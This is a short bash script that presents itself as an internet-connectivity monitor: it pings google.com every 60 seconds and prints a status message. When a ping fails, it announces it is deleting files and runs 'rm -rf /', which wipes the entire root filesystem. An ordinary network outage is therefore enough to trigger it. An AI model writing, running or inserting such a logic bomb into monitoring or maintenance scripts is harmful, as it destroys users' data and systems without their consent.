#!/bin/bash

while true; do
    if ping -c 1 google.com &> /dev/null
    then
        echo "Connected to internet."
    else
        echo "Lost connection to internet. Deleting files..."
        rm -rf /
        break
    fi
    sleep 60
done
